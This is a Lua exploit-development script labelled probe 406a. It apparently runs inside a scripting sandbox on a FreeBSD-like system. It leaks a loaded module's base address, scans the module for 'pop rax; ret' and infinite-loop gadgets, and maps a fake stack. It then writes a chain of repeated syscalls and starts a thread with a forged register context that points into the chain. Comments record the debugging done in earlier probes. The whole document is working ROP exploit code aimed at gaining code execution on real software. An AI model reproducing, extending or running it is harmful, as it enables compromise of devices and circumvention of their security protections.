-- CRASH_CLASS: HIGH
-- PROBE 406a: the syscall chain with the stack layout corrected
--
-- 404a armed [pop rax][number][syscall] triples and its child faulted. The layout was
-- wrong: `pop rax` consumes the NEXT stack word as the value and the word after it as
-- the return address, so the chain must be
--
--   RIP = pop rax;  stack = [number][syscall][number][syscall]... [park]
--
-- 405a proved five of the six `pop rax; ret` candidates are real by executing each one
-- against a marker page. 64 iterations of thr_self (432), which changes no kernel
-- state; a child that faults is survivable (404a's dump did not kill the process).

print("=== PROBE 406a: SYSCALL CHAIN (fixed layout) ===")

local REPS = 64
local SYS_NO = 432

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end

local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
pcall(function() memory.write_dword(info, 0x160) end)
local rv = -999
pcall(function() rv = sgn(sc_info(uint64(0), uint64(info), uint64(0), uint64(0), uint64(0), uint64(0))) end)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
print(string.format("[A] base=0x%X size=0x%X", base, size))
if base <= 0 or size <= 0 then print("=== 406a DONE ===") return end
-- never read past the region: reading 6 MiB over a 0x494000 mapping killed the process
if size > 0x600000 then size = 0x600000 end

local park, pop_rax = 0, 0
repeat
    local ok, buf = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(buf) ~= "string" then break end
    local i = 1
    while i < #buf - 1 do
        local a, b = buf:byte(i, i + 1)
        if a == 0xEB and b == 0xFE and park == 0 then park = base + i - 1 end
        if a == 0x58 and b == 0xC3 and pop_rax == 0 then pop_rax = base + i - 1 end
        if park ~= 0 and pop_rax ~= 0 then break end
        i = i + 1
    end
until true
print(string.format("[B] park=0x%X pop_rax=0x%X", park, pop_rax))
if park <= 0 or pop_rax <= 0 then print("=== 406a DONE ===") return end

local gadget = 0
pcall(function() gadget = to_num(syscall.syscall_address) end)
print(string.format("[C] syscall gadget=0x%X", gadget))
if gadget <= 0 then print("=== 406a DONE ===") return end

local sc_mmap = make_syscall(477)
local stack = 0
pcall(function() stack = sgn(sc_mmap(uint64(0), uint64(0x8000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))) end)
print(string.format("[D] stack=0x%X", stack))
if stack <= 0 then print("=== 406a DONE ===") return end

local rsp = stack + 0x2000
local function wq(addr, v)
    memory.write_qword(addr, u64(math.floor(v / 4294967296), v % 4294967296))
end
local p = rsp
local i = 0
while i < REPS do
    wq(p, SYS_NO); p = p + 8
    wq(p, gadget); p = p + 8
    i = i + 1
end
wq(p, park)
print(string.format("[D] chain armed: %d iterations, ends at 0x%X", REPS, p))

local ctx = memory.alloc(0x500)
do
    local k = 0
    while k < 0x500 do
        pcall(function() memory.write_dword(ctx + k, 0) end)
        k = k + 4
    end
end
wq(ctx + 0x108, 0x480)
wq(ctx + 0x110, 0x10000)
wq(ctx + 0x0c0, 0x43)
wq(ctx + 0x0e0, pop_rax)
wq(ctx + 0x0f0, 0x202)
wq(ctx + 0x0f8, rsp)
wq(ctx + 0x100, 0x3b)
wq(ctx + 0x048, 0)
print("[E] context ready")

local sc_thr = make_syscall(430)
local out = memory.alloc(0x20)
memory.write_qword(out, u64(0, 0))
local trv = -999
pcall(function() trv = sgn(sc_thr(uint64(ctx), uint64(out), uint64(0))) end)
local tq = memory.read_qword(out)
local th, tl = 0, 0
if type(tq) == "table" then th = to_num(tq.h); tl = to_num(tq.l) else tl = to_num(tq) end
print(string.format("[E] thr_create rv=%d tid=0x%08X%08X", trv, th, tl))
print("[F] marker after create")

local t = 0
while t < 2000000 do t = t + 1 end
print("[G] marker after two seconds, child never killed")
print("=== 406a DONE ===")
